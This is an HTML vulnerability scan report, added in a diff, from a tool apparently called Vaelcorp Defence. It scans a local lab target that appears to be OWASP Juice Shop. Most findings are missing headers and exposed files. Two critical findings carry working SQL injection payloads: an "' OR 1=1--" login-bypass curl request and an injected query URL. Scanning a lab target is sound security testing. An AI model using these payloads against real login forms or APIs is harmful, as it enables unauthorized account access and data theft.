@@ -1,0 +1,112 @@
+
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Vaelcorp Defence - Report</title>
+            <style>
+                body { background-color: #121212; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 20px; }
+                h1 { color: #ff4444; border-bottom: 2px solid #333; padding-bottom: 10px; }
+                .finding { background: #1e1e1e; border-left: 4px solid #ff4444; margin-bottom: 20px; padding: 15px; border-radius: 4px; }
+                .High { border-left-color: #ff4444; }
+                .Medium { border-left-color: #ffaa00; }
+                .Low { border-left-color: #00aaff; }
+                .badge { padding: 3px 8px; border-radius: 3px; font-weight: bold; font-size: 0.8em; }
+                .bg-High { background: #ff4444; color: #fff; }
+                .bg-Medium { background: #ffaa00; color: #000; }
+                .bg-Low { background: #00aaff; color: #fff; }
+                pre { background: #000; padding: 10px; border-radius: 4px; overflow-x: auto; color: #00ff00; }
+                .url-list { list-style-type: none; padding-left: 0; color: #888; }
+            </style>
+        </head>
+        <body>
+            <h1>Vaelcorp Defence - Scan Report</h1>
+            <p><strong>Target:</strong> http://127.0.0.1:3000</p>
+            <p><strong>Date:</strong> 2026-10-21_09-29-52</p>
+            <p><strong>Total Unique Findings:</strong> 14</p>
+            <hr style="border-color: #333;">
+        
+            <div class="finding Info">
+                <h3><span class="badge bg-Info">Info</span> 1. Missing Header: Strict-Transport-Security</h3>
+                <p><strong>Skill:</strong> Security Headers</p>
+                <p><strong>Evidence:</strong> HTTP 200 response did not contain Strict-Transport-Security.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Run this command to verify:
+curl -I http://127.0.0.1:3000</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000</li><li>http://127.0.0.1:3000/</li></ul></div>
+            <div class="finding Info">
+                <h3><span class="badge bg-Info">Info</span> 2. Missing Header: Content-Security-Policy</h3>
+                <p><strong>Skill:</strong> Security Headers</p>
+                <p><strong>Evidence:</strong> HTTP 200 response did not contain Content-Security-Policy.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Run this command to verify:
+curl -I http://127.0.0.1:3000</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000</li><li>http://127.0.0.1:3000/</li></ul></div>
+            <div class="finding Medium">
+                <h3><span class="badge bg-Medium">Medium</span> 3. Exposed Sensitive File: backup.zip</h3>
+                <p><strong>Skill:</strong> Sensitive Files</p>
+                <p><strong>Evidence:</strong> File returned HTTP 200 and matches expected content.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Open this URL in a browser or run:
+curl http://127.0.0.1:3000/backup.zip</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/backup.zip</li></ul></div>
+            <div class="finding Low">
+                <h3><span class="badge bg-Low">Low</span> 4. Exposed Sensitive File: api-docs</h3>
+                <p><strong>Skill:</strong> Sensitive Files</p>
+                <p><strong>Evidence:</strong> File returned HTTP 200 and matches expected content.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Open this URL in a browser or run:
+curl http://127.0.0.1:3000/api-docs</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/api-docs</li></ul></div>
+            <div class="finding Low">
+                <h3><span class="badge bg-Low">Low</span> 5. Exposed Sensitive File: .DS_Store</h3>
+                <p><strong>Skill:</strong> Sensitive Files</p>
+                <p><strong>Evidence:</strong> File returned HTTP 200 and matches expected content.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Open this URL in a browser or run:
+curl http://127.0.0.1:3000/.DS_Store</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/.DS_Store</li></ul></div>
+            <div class="finding Low">
+                <h3><span class="badge bg-Low">Low</span> 6. Exposed Directory/File: /metrics</h3>
+                <p><strong>Skill:</strong> Directory Bruteforce</p>
+                <p><strong>Evidence:</strong> Endpoint returned HTTP 200 OK with unique content.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Visit this URL in a browser:
+http://127.0.0.1:3000/metrics</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/metrics</li></ul></div>
+            <div class="finding Medium">
+                <h3><span class="badge bg-Medium">Medium</span> 7. Exposed Directory/File: /ftp</h3>
+                <p><strong>Skill:</strong> Directory Bruteforce</p>
+                <p><strong>Evidence:</strong> Endpoint returned HTTP 200 OK with unique content.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Visit this URL in a browser:
+http://127.0.0.1:3000/ftp</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/ftp</li></ul></div>
+            <div class="finding Medium">
+                <h3><span class="badge bg-Medium">Medium</span> 8. Exposed Directory/File: /robots.txt</h3>
+                <p><strong>Skill:</strong> Directory Bruteforce</p>
+                <p><strong>Evidence:</strong> Endpoint returned HTTP 200 OK with unique content.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Visit this URL in a browser:
+http://127.0.0.1:3000/robots.txt</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/robots.txt</li></ul></div>
+            <div class="finding Medium">
+                <h3><span class="badge bg-Medium">Medium</span> 9. Exposed Directory/File: /security.txt</h3>
+                <p><strong>Skill:</strong> Directory Bruteforce</p>
+                <p><strong>Evidence:</strong> Endpoint returned HTTP 200 OK with unique content.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Visit this URL in a browser:
+http://127.0.0.1:3000/security.txt</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/security.txt</li></ul></div>
+            <div class="finding Medium">
+                <h3><span class="badge bg-Medium">Medium</span> 10. Exposed Directory/File: /.well-known/security.txt</h3>
+                <p><strong>Skill:</strong> Directory Bruteforce</p>
+                <p><strong>Evidence:</strong> Endpoint returned HTTP 200 OK with unique content.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Visit this URL in a browser:
+http://127.0.0.1:3000/.well-known/security.txt</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/.well-known/security.txt</li></ul></div>
+            <div class="finding Medium">
+                <h3><span class="badge bg-Medium">Medium</span> 11. Exposed Directory/File: /api-docs</h3>
+                <p><strong>Skill:</strong> Directory Bruteforce</p>
+                <p><strong>Evidence:</strong> Endpoint returned HTTP 200 OK with unique content.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Visit this URL in a browser:
+http://127.0.0.1:3000/api-docs</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/api-docs</li></ul></div>
+            <div class="finding High">
+                <h3><span class="badge bg-High">High</span> 12. Exposed Credential/Secret: Email Address</h3>
+                <p><strong>Skill:</strong> JavaScript Secret Scanner</p>
+                <p><strong>Evidence:</strong> JavaScript file contains a hardcoded Email Address.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Found Email Address in http://127.0.0.1:3000/main.js:
+
+testing@juice-sh.op</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/main.js</li><li>http://127.0.0.1:3000/main.js</li></ul></div>
+            <div class="finding Critical">
+                <h3><span class="badge bg-Critical">Critical</span> 13. Authentication Bypass (SQLi/NoSQLi/Weak Pass)</h3>
+                <p><strong>Skill:</strong> API JSON Injection (Login Bypass)</p>
+                <p><strong>Evidence:</strong> Payload successfully bypassed authentication. Server returned a token.</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Run this to bypass login:
+curl -X POST -H &#x27;Content-Type: application/json&#x27; -d &#x27;{&quot;email&quot;: &quot;&#x27; OR 1=1--&quot;, &quot;password&quot;: &quot;test&quot;}&#x27; http://127.0.0.1:3000/rest/user/login</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/rest/user/login</li></ul></div>
+            <div class="finding Critical">
+                <h3><span class="badge bg-Critical">Critical</span> 14. SQL Injection in parameter &#x27;name&#x27; (GET)</h3>
+                <p><strong>Skill:</strong> SQL Injection (Error & Boolean)</p>
+                <p><strong>Evidence:</strong> Boolean-based response difference (Baseline: 475 bytes, Injected: 30 bytes)</p>
+            <p><strong>Proof of Concept:</strong></p><pre>Open this URL in a browser to verify:
+http://127.0.0.1:3000/api/Challenges/?name=Score+Board+%27+OR+1%3D1--</pre><p><strong>Affected URLs:</strong></p><ul class='url-list'><li>http://127.0.0.1:3000/api/Challenges/?name=Score+Board+%27+OR+1%3D1--</li></ul></div></body></html>
